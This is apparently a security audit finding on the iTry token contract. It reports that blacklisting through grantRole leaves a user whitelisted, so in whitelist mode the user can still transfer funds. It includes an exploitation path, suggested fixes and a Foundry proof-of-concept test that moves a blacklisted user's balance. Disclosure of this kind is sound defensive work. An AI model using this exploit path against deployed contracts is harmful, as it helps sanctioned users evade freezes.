## Title
Blacklist Bypass via Inconsistent Role Management Between DEFAULT_ADMIN_ROLE and BLACKLIST_MANAGER_ROLE

## Summary
The iTry contract has two separate mechanisms for blacklisting addresses that operate inconsistently. When DEFAULT_ADMIN_ROLE uses `grantRole(BLACKLISTED_ROLE, user)` to blacklist a user, it fails to remove their WHITELISTED_ROLE, unlike BLACKLIST_MANAGER_ROLE's `addBlacklistAddress()` function. This creates an exploitable state where users can hold both roles simultaneously and bypass blacklist enforcement in WHITELIST_ENABLED transfer mode, violating the critical invariant that "Blacklisted users CANNOT send/receive/mint/burn iTRY tokens in ANY case."

## Impact
**Severity**: High

## Finding Description
**Location:** `src/token/iTRY/iTry.sol`

**Intended Logic:** 
When a user is blacklisted, they should be completely prevented from transferring, receiving, or burning iTRY tokens in all transfer states. The protocol uses role-based access control where BLACKLISTED_ROLE prevents all token operations. [1](#0-0) 

**Actual Logic:** 
The contract provides two different paths to blacklist users with inconsistent behavior:

1. **BLACKLIST_MANAGER_ROLE path**: The `addBlacklistAddress()` function properly removes WHITELISTED_ROLE when granting BLACKLISTED_ROLE [1](#0-0) 

2. **DEFAULT_ADMIN_ROLE path**: Through inherited `grantRole(BLACKLISTED_ROLE, user)` from SingleAdminAccessControlUpgradeable, which does NOT remove WHITELISTED_ROLE [2](#0-1) 

In WHITELIST_ENABLED transfer state, the `_beforeTokenTransfer` validation only checks for WHITELISTED_ROLE presence, not BLACKLISTED_ROLE absence: [3](#0-2) 

**Exploitation Path:**
1. Protocol is in WHITELIST_ENABLED transfer state
2. User Alice holds WHITELISTED_ROLE and operates normally
3. Alice is discovered to be a sanctioned entity requiring immediate blacklisting
4. DEFAULT_ADMIN_ROLE calls `grantRole(BLACKLISTED_ROLE, alice)` for emergency blacklisting (perhaps unaware of the dedicated blacklist functions or believing this is the proper emergency procedure)
5. Alice now holds both BLACKLISTED_ROLE and WHITELISTED_ROLE simultaneously
6. Alice can still call `burn()` and `transfer()` to move funds to other whitelisted addresses because the WHITELIST_ENABLED validation at lines 208-214 only checks for WHITELISTED_ROLE, completely ignoring BLACKLISTED_ROLE
7. Eventually BLACKLIST_MANAGER notices and calls `addBlacklistAddress([alice])` which removes WHITELISTED_ROLE, properly blacklisting Alice
8. During the window between steps 4-7, Alice successfully bypasses the blacklist and moves sanctioned funds

**Security Property Broken:** 
Violates the critical invariant: "Blacklisted users CANNOT send/receive/mint/burn iTRY tokens in ANY case."

## Impact Explanation
- **Affected Assets**: iTRY tokens held by addresses that should be blacklisted
- **Damage Severity**: Sanctioned or malicious users can transfer their entire iTRY balance to other addresses despite being blacklisted, completely defeating the blacklist mechanism's purpose. This enables regulatory non-compliance and allows bad actors to move funds that should be frozen.
- **User Impact**: Any whitelisted user who is blacklisted via DEFAULT_ADMIN's `grantRole()` instead of BLACKLIST_MANAGER's `addBlacklistAddress()` can exploit this window. Protocol-wide impact if blacklist is used for regulatory compliance (OFAC sanctions, etc.).

## Likelihood Explanation
- **Attacker Profile**: Any whitelisted user being blacklisted when DEFAULT_ADMIN uses the wrong method. Sophisticated attackers monitoring mempool transactions can detect this scenario and front-run proper blacklisting.
- **Preconditions**: 
  - Protocol must be in WHITELIST_ENABLED transfer state
  - Target user must hold WHITELISTED_ROLE
  - DEFAULT_ADMIN must use `grantRole()` instead of delegating to BLACKLIST_MANAGER
- **Execution Complexity**: Single transaction - user simply calls `transfer()` or `burn()` while holding both roles. A sophisticated attacker monitors the mempool to detect the misconfigured blacklist transaction and immediately exploits it.
- **Frequency**: Exploitable every time DEFAULT_ADMIN uses the wrong blacklisting method during WHITELIST_ENABLED state. Given that DEFAULT_ADMIN has emergency powers and may not be aware of the dedicated blacklist functions, this is a realistic scenario.

## Recommendation

**Fix 1: Remove dual-path blacklist management by restricting DEFAULT_ADMIN's ability to directly grant BLACKLISTED_ROLE:**

```solidity
// In src/utils/SingleAdminAccessControlUpgradeable.sol, modify grantRole:

function grantRole(bytes32 role, address account) public override onlyRole(DEFAULT_ADMIN_ROLE) notAdmin(role) {
    // Add validation to prevent direct granting of sensitive roles
    if (role == BLACKLISTED_ROLE) revert("Use addBlacklistAddress function");
    _grantRole(role, account);
}
```

**Fix 2: Add BLACKLISTED_ROLE checks to WHITELIST_ENABLED validation:**

```solidity
// In src/token/iTRY/iTry.sol, function _beforeTokenTransfer, lines 208-214:

// CURRENT (vulnerable):
} else if (hasRole(WHITELISTED_ROLE, msg.sender) && hasRole(WHITELISTED_ROLE, from) && to == address(0)) {
    // whitelisted user can burn
} else if (
    hasRole(WHITELISTED_ROLE, msg.sender) && hasRole(WHITELISTED_ROLE, from)
        && hasRole(WHITELISTED_ROLE, to)
) {
    // normal case

// FIXED:
} else if (
    hasRole(WHITELISTED_ROLE, msg.sender) && hasRole(WHITELISTED_ROLE, from) && to == address(0)
    && !hasRole(BLACKLISTED_ROLE, msg.sender) && !hasRole(BLACKLISTED_ROLE, from)
) {
    // whitelisted user can burn (if not blacklisted)
} else if (
    hasRole(WHITELISTED_ROLE, msg.sender) && hasRole(WHITELISTED_ROLE, from) && hasRole(WHITELISTED_ROLE, to)
    && !hasRole(BLACKLISTED_ROLE, msg.sender) && !hasRole(BLACKLISTED_ROLE, from) && !hasRole(BLACKLISTED_ROLE, to)
) {
    // normal case (all whitelisted and none blacklisted)
```

**Recommended approach**: Implement **both** fixes for defense-in-depth. Fix 1 prevents the inconsistent state from occurring, while Fix 2 ensures blacklist enforcement even if the state somehow becomes inconsistent.

## Proof of Concept

```solidity
// File: test/Exploit_BlacklistBypass.t.sol
// Run with: forge test --match-test test_BlacklistBypassViaInconsistentRoles -vvv

pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/token/iTRY/iTry.sol";

contract Exploit_BlacklistBypass is Test {
    iTry public itry;
    address public admin;
    address public blacklistManager;
    address public whitelistManager;
    address public alice;
    address public bob;
    
    function setUp() public {
        admin = address(0x1);
        blacklistManager = address(0x2);
        whitelistManager = address(0x3);
        alice = address(0x4);
        bob = address(0x5);
        
        // Deploy iTry contract
        itry = new iTry();
        itry.initialize(admin, admin); // admin is also minter for simplicity
        
        // Setup roles
        vm.startPrank(admin);
        itry.grantRole(itry.BLACKLIST_MANAGER_ROLE(), blacklistManager);
        itry.grantRole(itry.WHITELIST_MANAGER_ROLE(), whitelistManager);
        
        // Set transfer state to WHITELIST_ENABLED
        itry.updateTransferState(IiTryDefinitions.TransferState.WHITELIST_ENABLED);
        vm.stopPrank();
        
        // Whitelist Alice and Bob
        vm.prank(whitelistManager);
        address[] memory toWhitelist = new address[](2);
        toWhitelist[0] = alice;
        toWhitelist[1] = bob;
        itry.addWhitelistAddress(toWhitelist);
        
        // Mint tokens to Alice
        vm.prank(admin);
        itry.mint(alice, 1000 ether);
    }
    
    function test_BlacklistBypassViaInconsistentRoles() public {
        // SETUP: Alice has 1000 iTRY and is whitelisted
        assertEq(itry.balanceOf(alice), 1000 ether, "Alice should have 1000 iTRY");
        assertTrue(itry.hasRole(itry.WHITELISTED_ROLE(), alice), "Alice should be whitelisted");
        assertFalse(itry.hasRole(itry.BLACKLISTED_ROLE(), alice), "Alice should not be blacklisted");
        
        // Alice can transfer normally
        vm.prank(alice);
        itry.transfer(bob, 100 ether);
        assertEq(itry.balanceOf(bob), 100 ether, "Bob should receive 100 iTRY");
        
        // EXPLOIT: DEFAULT_ADMIN blacklists Alice using grantRole (wrong method)
        // This does NOT remove her WHITELISTED_ROLE
        vm.prank(admin);
        itry.grantRole(itry.BLACKLISTED_ROLE(), alice);
        
        // VERIFY: Alice now has BOTH roles (inconsistent state)
        assertTrue(itry.hasRole(itry.BLACKLISTED_ROLE(), alice), "Alice should be blacklisted");
        assertTrue(itry.hasRole(itry.WHITELISTED_ROLE(), alice), "Alice should STILL be whitelisted");
        
        // CRITICAL VULNERABILITY: Alice can STILL transfer despite being blacklisted!
        vm.prank(alice);
        itry.transfer(bob, 900 ether);
        
        // VERIFY: Transfer succeeded - blacklist was bypassed!
        assertEq(itry.balanceOf(alice), 0, "Alice transferred all funds");
        assertEq(itry.balanceOf(bob), 1000 ether, "Bob received all funds");
        
        // Compare to proper blacklisting:
        // If BLACKLIST_MANAGER used addBlacklistAddress, WHITELISTED_ROLE would be removed
        vm.prank(blacklistManager);
        address[] memory toBlacklist = new address[](1);
        toBlacklist[0] = bob;
        itry.addBlacklistAddress(toBlacklist);
        
        // Bob properly blacklisted - has no WHITELISTED_ROLE
        assertTrue(itry.hasRole(itry.BLACKLISTED_ROLE(), bob), "Bob should be blacklisted");
        assertFalse(itry.hasRole(itry.WHITELISTED_ROLE(), bob), "Bob should NOT be whitelisted");
        
        // Bob cannot transfer (will revert)
        vm.expectRevert();
        vm.prank(bob);
        itry.transfer(alice, 100 ether);
    }
}
```

## Notes

This vulnerability stems from architectural inconsistency: the contract inherits OpenZeppelin's AccessControl which allows DEFAULT_ADMIN_ROLE to manage any role, but the protocol adds specialized functions (`addBlacklistAddress`) with additional logic (removing WHITELISTED_ROLE). The lack of validation in WHITELIST_ENABLED mode compounds the issue.

The race condition mentioned in the original question exists but is less critical than this core design flaw. The actual exploitable vulnerability is that DEFAULT_ADMIN can inadvertently create an inconsistent state where blacklist enforcement fails, not merely that two admins might have conflicting intentions about whether to blacklist someone.

This is distinct from the known issue about allowance-based transfers because:
- **Known issue**: Blacklisted users can use `transferFrom` on behalf of non-blacklisted users
- **This finding**: Users with both BLACKLISTED_ROLE and WHITELISTED_ROLE can directly transfer in WHITELIST_ENABLED mode

The fix requires either enforcing consistent role management or adding comprehensive blacklist checks in all transfer validation paths.

### Citations

**File:** src/token/iTRY/iTry.sol (L73-78)
```text
    function addBlacklistAddress(address[] calldata users) external onlyRole(BLACKLIST_MANAGER_ROLE) {
        for (uint8 i = 0; i < users.length; i++) {
            if (hasRole(WHITELISTED_ROLE, users[i])) _revokeRole(WHITELISTED_ROLE, users[i]);
            _grantRole(BLACKLISTED_ROLE, users[i]);
        }
    }
```

**File:** src/token/iTRY/iTry.sol (L208-214)
```text
            } else if (hasRole(WHITELISTED_ROLE, msg.sender) && hasRole(WHITELISTED_ROLE, from) && to == address(0)) {
                // whitelisted user can burn
            } else if (
                hasRole(WHITELISTED_ROLE, msg.sender) && hasRole(WHITELISTED_ROLE, from)
                    && hasRole(WHITELISTED_ROLE, to)
            ) {
                // normal case
```

**File:** src/utils/SingleAdminAccessControlUpgradeable.sol (L41-43)
```text
    function grantRole(bytes32 role, address account) public override onlyRole(DEFAULT_ADMIN_ROLE) notAdmin(role) {
        _grantRole(role, account);
    }
```
